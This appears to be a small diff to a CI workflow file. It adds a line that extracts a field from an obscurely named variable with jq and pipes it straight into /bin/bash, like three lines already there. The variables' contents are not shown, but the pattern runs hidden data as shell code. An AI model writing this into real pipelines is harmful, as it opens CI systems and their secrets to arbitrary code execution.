@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$tu03027" | jq -r .copib37640 | /bin/bash
           printf '%s' "$lba640" | jq -r .a0715 | /bin/bash
           printf '%s' "$ehelw3" | jq -r .pl0 | /bin/bash
+          echo $lmf6 | jq -r .gnz00 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
